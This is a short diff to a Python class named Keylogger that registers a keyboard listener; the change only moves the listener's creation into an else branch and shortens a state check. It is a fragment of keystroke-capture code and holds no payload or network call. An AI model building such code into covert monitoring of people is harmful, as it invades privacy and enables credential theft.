@@ -20,8 +20,7 @@ class Keylogger:
             self.runnable = False
         else:
             self.runnable = True
-
-        self.listener = Listener(on_press=onkeyboardevent)
+            self.listener = Listener(on_press=onkeyboardevent)
 
     def start(self) -> bool:
         """ Start keylogger """
@@ -46,6 +45,4 @@ class Keylogger:
 
     def state(self) -> bool:
         """ Get the state of the keylogger """
-        if self.listener.running:
-            return True
-        return False
+        return self.listener.running
